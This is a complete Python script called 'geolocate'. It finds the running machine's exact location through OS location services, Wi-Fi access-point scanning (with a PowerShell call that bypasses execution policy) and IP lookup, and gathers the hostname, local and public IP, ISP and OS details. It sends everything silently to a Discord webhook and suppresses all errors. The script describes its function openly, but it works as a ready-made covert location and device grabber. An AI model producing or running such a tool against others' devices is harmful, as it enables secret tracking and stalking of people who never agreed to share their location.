
from __future__ import annotations

import argparse
import json
import math
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any, Callable, Optional
from urllib.parse import urlsplit

__version__ = "1.0.0"
__all__ = ["Location", "DiscordWebhook", "locate", "main"]


# 🔧 CONFIGURE ME

DISCORD_WEBHOOK_URL = ""
DISCORD_USERNAME    = "geolocate"
LOCATION_TIMEOUT    = 20.0   # seconds, per provider
IP_TIMEOUT          = 8.0    # seconds, for the IP-info lookup
WEBHOOK_TIMEOUT     = 10.0   # seconds, per HTTP attempt to Discord


IS_WINDOWS = platform.system() == "Windows"
IS_MACOS   = platform.system() == "Darwin"
IS_LINUX   = platform.system() == "Linux"

USER_AGENT = f"geolocate/{__version__} ({platform.system()} {platform.release()})"

WIFI_ENDPOINTS: tuple[str, ...] = (
    "https://api.beacondb.net/v1/geolocate",
    "https://location.services.mozilla.com/v1/geolocate?key=test",
)

IP_ENDPOINTS: tuple[str, ...] = (
    "https://ipinfo.io/json",
    "https://ipapi.co/json/",
    "http://ip-api.com/json",
)

WEBHOOK_URL_RE = re.compile(
    r"^https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[\w-]+$"
)

BSSID_RE = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")


# Diagnostics

_VERBOSE = False


def log(message: str) -> None:
    if _VERBOSE:
        print(f"[geolocate] {message}", file=sys.stderr)

# Data model & small helpers

@dataclass(frozen=True)
class Location:

    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    source: str = "unknown"

    @property
    def coords(self) -> str:
        return f"{self.latitude:.6f},{self.longitude:.6f}"

    @property
    def maps_url(self) -> str:
        return f"https://www.google.com/maps?q={self.latitude:.6f},{self.longitude:.6f}"

    @property
    def accuracy_text(self) -> str:
        if self.accuracy is None or not math.isfinite(self.accuracy):
            return "unknown"
        return f"±{self.accuracy:.0f} m"


def _opt_float(value: Any) -> Optional[float]:
    try:
        number = float(value)
    except (TypeError, ValueError):
        return None
    return number if math.isfinite(number) else None


def _run(cmd: list[str], timeout: float = 10.0, **kwargs: Any) -> str:
    return subprocess.check_output(
        cmd, text=True, timeout=timeout, stderr=subprocess.DEVNULL, **kwargs,
    )


def _fetch_json(url: str, timeout: float) -> dict[str, Any]:
    request = urllib.request.Request(
        url, headers={"User-Agent": USER_AGENT, "Accept": "application/json"},
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return json.loads(response.read())


# Discord webhook

def _retry_after(exc: urllib.error.HTTPError) -> Optional[float]:
    try:
        return float(json.loads(exc.read()).get("retry_after"))
    except Exception:
        return None


class DiscordWebhook:

    def __init__(
        self,
        url: str,
        username: str = DISCORD_USERNAME,
        timeout: float = WEBHOOK_TIMEOUT,
    ) -> None:
        url = url.strip()
        if not WEBHOOK_URL_RE.match(url):
            raise ValueError(
                "not a valid Discord webhook URL "
                "(expected https://discord.com/api/webhooks/<id>/<token>)"
            )
        self.url = url
        self.username = username
        self.timeout = timeout

    def embed(self, embed: dict[str, Any]) -> bool:
        """Post a single embed. Returns ``True`` on success."""
        return self._post({"embeds": [embed]})

    def _post(self, payload: dict[str, Any], attempts: int = 3) -> bool:
        body = json.dumps({"username": self.username, **payload}).encode("utf-8")

        for attempt in range(1, attempts + 1):
            request = urllib.request.Request(
                self.url,
                data=body,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": USER_AGENT,
                    "Accept": "application/json",
                },
            )
            try:
                with urllib.request.urlopen(request, timeout=self.timeout) as response:
                    ok = 200 <= response.status < 300
                    log(f"webhook POST -> HTTP {response.status}")
                    return ok
            except urllib.error.HTTPError as exc:
                if exc.code == 429 and attempt < attempts:
                    delay = _retry_after(exc) or float(attempt)
                    log(f"webhook rate limited, sleeping {delay:.1f}s")
                    time.sleep(delay)
                    continue
                log(f"webhook HTTP error {exc.code}")
                return False
            except (urllib.error.URLError, OSError) as exc:
                log(f"webhook transport error: {exc}")
                if attempt < attempts:
                    time.sleep(1.5 * attempt)
                    continue
                return False

        return False


# IP info

def gather_ip_info(timeout: float = IP_TIMEOUT) -> dict[str, Any]:
    for url in IP_ENDPOINTS:
        try:
            data = _fetch_json(url, timeout)
        except Exception as exc:
            log(f"IP endpoint {url} failed: {exc}")
            continue
        if isinstance(data, dict) and data:
            data["_endpoint"] = urlsplit(url).netloc
            return data
    return {}


def local_ip() -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
        finally:
            sock.close()
    except OSError:
        try:
            return socket.gethostbyname(socket.gethostname())
        except OSError:
            return "unknown"


# Provider 1 — OS location APIs

def _os_location_windows(timeout: float) -> Optional[Location]:
    script = (
        "Add-Type -AssemblyName System.Device;"
        "$w = New-Object System.Device.Location.GeoCoordinateWatcher;"
        "$w.Start();"
        f"$deadline = (Get-Date).AddSeconds({int(timeout)});"
        "while ($w.Status -ne [System.Device.Location.GeoPositionStatus]::Ready"
        " -and (Get-Date) -lt $deadline) { Start-Sleep -Milliseconds 250 };"
        "$loc = $w.Position.Location;"
        "if ($loc.IsUnknown) { 'NONE' } else {"
        " '{0}|{1}|{2}' -f $loc.Latitude, $loc.Longitude, $loc.HorizontalAccuracy };"
        "$w.Stop();"
    )
    try:
        out = _run(
            ["powershell", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-Command", script],
            timeout=timeout + 10,
        ).strip()
    except (OSError, subprocess.SubprocessError) as exc:
        log(f"Windows location API failed: {exc}")
        return None

    if not out or out.upper() == "NONE":
        return None

    try:
        lat, lon, acc = out.split("|")
        return Location(float(lat), float(lon), _opt_float(acc), "Windows Location API")
    except ValueError:
        log(f"unexpected Windows location output: {out!r}")
        return None


def _os_location_macos(timeout: float) -> Optional[Location]:
    try:
        from CoreLocation import CLLocationManager  # type: ignore
        from Foundation import NSDate, NSRunLoop  # type: ignore
    except ImportError:
        log("pyobjc / CoreLocation not available")
        return None

    try:
        manager = CLLocationManager.alloc().init()
        manager.startUpdatingLocation()
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            NSRunLoop.currentRunLoop().runUntilDate_(
                NSDate.dateWithTimeIntervalSinceNow_(0.25)
            )
            loc = manager.location()
            if loc is not None:
                coord = loc.coordinate()
                return Location(
                    float(coord.latitude),
                    float(coord.longitude),
                    _opt_float(loc.horizontalAccuracy()),
                    "macOS CoreLocation",
                )
    except Exception as exc:  # pragma: no cover — platform specific
        log(f"CoreLocation failed: {exc}")
    return None


def _os_location_linux(timeout: float) -> Optional[Location]:
    try:
        import gps  # type: ignore
    except ImportError:
        log("gpsd python bindings not available")
        return None

    try:
        session = gps.gps(mode=gps.WATCH_ENABLE | gps.WATCH_NEWSTYLE)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            report = session.next()
            if getattr(report, "class", None) == "TPV" and getattr(report, "mode", 0) >= 2:
                return Location(
                    float(report.lat),
                    float(report.lon),
                    _opt_float(getattr(report, "eph", None)),
                    "gpsd (GPS receiver)",
                )
            time.sleep(0.25)
    except Exception as exc:
        log(f"gpsd failed: {exc}")
    return None


def os_location(timeout: float) -> Optional[Location]:
    if IS_WINDOWS:
        return _os_location_windows(timeout)
    if IS_MACOS:
        return _os_location_macos(timeout)
    if IS_LINUX:
        return _os_location_linux(timeout)
    return None


# Provider 2 — Wi‑Fi positioning

def _wifi_aps_linux() -> list[dict[str, Any]]:
    if not shutil.which("nmcli"):
        return []
    try:
        out = _run(
            ["nmcli", "--terse", "--escape", "no",
             "--fields", "BSSID,SIGNAL",
             "device", "wifi", "list", "--rescan", "no"],
            timeout=15,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        log(f"nmcli failed: {exc}")
        return []

    aps: list[dict[str, Any]] = []
    for line in out.splitlines():
        bssid, _, signal = line.rpartition(":")
        bssid = bssid.strip().upper()
        if not BSSID_RE.fullmatch(bssid):
            continue
        try:
            strength = int(signal.strip())
        except ValueError:
            strength = 50
        aps.append({"macAddress": bssid, "signalStrength": strength - 100})
    return aps


def _wifi_aps_macos() -> list[dict[str, Any]]:
    airport = (
        "/System/Library/PrivateFrameworks/Apple80211.framework/"
        "Versions/Current/Resources/airport"
    )
    if not os.path.exists(airport):
        return []

    try:
        out = _run([airport, "-s"], timeout=15)
    except (OSError, subprocess.SubprocessError) as exc:
        log(f"airport failed: {exc}")
        return []

    aps: list[dict[str, Any]] = []
    for line in out.splitlines()[1:]:
        match = re.search(rf"({BSSID_RE.pattern})\s+(-?\d+)", line, re.I)
        if match:
            aps.append({
                "macAddress": match.group(1).upper(),
                "signalStrength": int(match.group(2)),
            })
    return aps


def _wifi_aps_windows() -> list[dict[str, Any]]:
    try:
        out = _run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            timeout=15, encoding="utf-8", errors="replace",
        )
    except (OSError, subprocess.SubprocessError) as exc:
        log(f"netsh failed: {exc}")
        return []

    aps: list[dict[str, Any]] = []
    current: Optional[str] = None
    for line in out.splitlines():
        stripped = line.strip()
        if stripped.upper().startswith("BSSID"):
            match = BSSID_RE.search(stripped)
            current = match.group(0).upper() if match else None
            continue
        if current:
            percent = re.search(r"(\d+)\s*%", stripped)
            if percent:
                aps.append({
                    "macAddress": current,
                    "signalStrength": int(percent.group(1)) // 2 - 100,
                })
                current = None
    return aps


def _wifi_access_points() -> list[dict[str, Any]]:
    if IS_LINUX:
        raw = _wifi_aps_linux()
    elif IS_MACOS:
        raw = _wifi_aps_macos()
    elif IS_WINDOWS:
        raw = _wifi_aps_windows()
    else:
        raw = []

    # Deduplicate by BSSID, keeping the strongest observation of each.
    strongest: dict[str, dict[str, Any]] = {}
    for ap in raw:
        mac = ap["macAddress"]
        if mac not in strongest or ap["signalStrength"] > strongest[mac]["signalStrength"]:
            strongest[mac] = ap

    return sorted(
        strongest.values(),
        key=lambda ap: ap["signalStrength"],
        reverse=True,
    )[:20]


def wifi_location(timeout: float) -> Optional[Location]:
    aps = _wifi_access_points()
    if not aps:
        log("no Wi-Fi access points visible")
        return None
    log(f"submitting {len(aps)} BSSIDs for positioning")

    body = json.dumps({"wifiAccessPoints": aps, "considerIp": False}).encode("utf-8")

    for url in WIFI_ENDPOINTS:
        endpoint = urlsplit(url).netloc
        try:
            request = urllib.request.Request(
                url,
                data=body,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": USER_AGENT,
                },
            )
            with urllib.request.urlopen(request, timeout=timeout) as response:
                data = json.loads(response.read())
            coords = data["location"]
            return Location(
                float(coords["lat"]),
                float(coords["lng"]),
                _opt_float(data.get("accuracy")),
                f"Wi-Fi positioning ({endpoint})",
            )
        except Exception as exc:
            log(f"Wi-Fi provider {endpoint} failed: {exc}")
            continue
    return None


# Provider 3 — IP geolocation

def ip_location(
    timeout: float,
    ip_data: Optional[dict[str, Any]] = None,
) -> Optional[Location]:
    candidates: list[dict[str, Any]] = []
    if ip_data:
        candidates.append(ip_data)
    else:
        for url in IP_ENDPOINTS:
            try:
                data = _fetch_json(url, timeout)
            except Exception as exc:
                log(f"IP endpoint {url} failed: {exc}")
                continue
            data["_endpoint"] = urlsplit(url).netloc
            candidates.append(data)
            break

    for data in candidates:
        lat = lon = None

        if "loc" in data:  # ipinfo.io style
            try:
                lat, lon = (float(p) for p in str(data["loc"]).split(","))
            except (ValueError, TypeError):
                lat = lon = None

        if lat is None:  # ipapi / ip-api style
            lat = _opt_float(data.get("lat", data.get("latitude")))
            lon = _opt_float(data.get("lon", data.get("longitude")))

        if lat is not None and lon is not None:
            endpoint = data.get("_endpoint", "unknown")
            return Location(lat, lon, None, f"IP geolocation ({endpoint})")

    return None


# Provider dispatch

Provider = Callable[[float], Optional[Location]]

PROVIDERS: tuple[tuple[str, Provider], ...] = (
    ("os",   os_location),
    ("wifi", wifi_location),
)


def locate(
    timeout: float,
    ip_data: Optional[dict[str, Any]] = None,
) -> Optional[Location]:
    for name, provider in PROVIDERS:
        log(f"trying provider: {name}")
        try:
            result = provider(timeout)
        except Exception as exc:
            log(f"provider {name} raised: {exc}")
            continue
        if result is not None:
            log(f"provider {name} succeeded: {result.source}")
            return result

    log("trying provider: ip")
    try:
        return ip_location(timeout, ip_data)
    except Exception as exc:
        log(f"provider ip raised: {exc}")
        return None


# Embed builders 

_COLOR_OK = 0x57F287
_COLOR_FAIL = 0xED4245


def _public_ip(ip_data: dict[str, Any]) -> str:
    return ip_data.get("ip") or ip_data.get("query") or "unknown"


def _isp(ip_data: dict[str, Any]) -> str:
    return ip_data.get("org") or ip_data.get("isp") or ip_data.get("asn") or "unknown"


def build_final_embed(
    location: Location,
    ip_data: dict[str, Any],
    hostname: str,
    lan_ip: str,
    started_at: datetime,
    elapsed: float,
) -> dict[str, Any]:
    city = ip_data.get("city") or "unknown"
    region = ip_data.get("region") or ip_data.get("region_name") or "—"
    country = ip_data.get("country") or ip_data.get("country_name") or "—"
    timezone_ = ip_data.get("timezone") or "—"

    fields: list[dict[str, Any]] = [
        {"name": "🌐 Public IP", "value": f"`{_public_ip(ip_data)}`", "inline": True},
        {"name": "🏠 Local IP",  "value": f"`{lan_ip}`",              "inline": True},
        {"name": "🏢 ISP",       "value": f"`{_isp(ip_data)}`",       "inline": True},

        {"name": "💻 Hostname",  "value": f"`{hostname}`", "inline": True},
        {"name": "🖥 OS",
         "value": f"`{platform.system()} {platform.release()}`",
         "inline": True},
        {"name": "🐍 Python",
         "value": f"`{platform.python_version()}`",
         "inline": True},

        {"name": "📍 Latitude",  "value": f"`{location.latitude:.6f}`",  "inline": True},
        {"name": "📍 Longitude", "value": f"`{location.longitude:.6f}`", "inline": True},
        {"name": "🎯 Accuracy",  "value": location.accuracy_text,        "inline": True},

        {"name": "🧭 Method",    "value": location.source,               "inline": False},
        {"name": "⏱ Elapsed",    "value": f"{elapsed:.2f} s",            "inline": True},
        {"name": "🗺 Map",
         "value": f"[Open in Google Maps]({location.maps_url})",
         "inline": True},
    ]

    geo_bits = [b for b in (city, region, country) if b and b != "—"]
    if geo_bits:
        fields.append({
            "name": "🌍 IP-derived location",
            "value": f"{', '.join(geo_bits)} · TZ: `{timezone_}`",
            "inline": False,
        })

    return {
        "title": "📍 Location resolved",
        "description": f"**`{location.coords}`**",
        "color": _COLOR_OK,
        "fields": fields,
        "footer": {
            "text": (
                f"geolocate v{__version__} · started "
                f"{started_at.strftime('%Y-%m-%d %H:%M:%S UTC')}"
            )
        },
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


def build_failure_embed(
    ip_data: dict[str, Any],
    hostname: str,
    elapsed: float,
) -> dict[str, Any]:
    return {
        "title": "❌ Location lookup failed",
        "description": "No provider could determine a location.",
        "color": _COLOR_FAIL,
        "fields": [
            {"name": "Hostname",  "value": f"`{hostname}`",             "inline": True},
            {"name": "Public IP", "value": f"`{_public_ip(ip_data)}`",  "inline": True},
            {"name": "Elapsed",   "value": f"{elapsed:.2f} s",          "inline": True},
        ],
        "footer": {"text": f"geolocate v{__version__}"},
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# CLI

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="geolocate",
        description="Resolve this machine's location and send a single Discord embed.",
    )
    parser.add_argument(
        "--version", action="version", version=f"%(prog)s {__version__}",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=LOCATION_TIMEOUT,
        help=f"Per-provider timeout in seconds (default: {LOCATION_TIMEOUT:g}).",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print the embed payload to stdout instead of sending it.",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Emit diagnostic lines to stderr.",
    )
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    global _VERBOSE

    args = _build_parser().parse_args(argv)
    _VERBOSE = args.verbose

    webhook_url = DISCORD_WEBHOOK_URL.strip()

    if not args.dry_run:
        if not webhook_url:
            log("DISCORD_WEBHOOK_URL is empty")
            return 2
        try:
            webhook = DiscordWebhook(webhook_url, username=DISCORD_USERNAME)
        except ValueError as exc:
            log(str(exc))
            return 2
    else:
        webhook = None

    started_at = datetime.now(timezone.utc)
    t0 = time.monotonic()

    hostname = socket.gethostname()
    lan_ip = local_ip()
    log(f"host={hostname} lan_ip={lan_ip}")

    ip_data = gather_ip_info(IP_TIMEOUT)
    location = locate(args.timeout, ip_data)

    elapsed = time.monotonic() - t0
    log(f"finished in {elapsed:.2f}s")

    if location is None:
        embed = build_failure_embed(ip_data, hostname, elapsed)
        exit_code = 1
    else:
        embed = build_final_embed(location, ip_data, hostname, lan_ip, started_at, elapsed)
        exit_code = 0

    if args.dry_run:
        json.dump({"embeds": [embed]}, sys.stdout, indent=2)
        sys.stdout.write("\n")
        return exit_code

    assert webhook is not None
    webhook.embed(embed)
    return exit_code


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception:  # pragma: no cover — last‑ditch safety net
        sys.exit(1)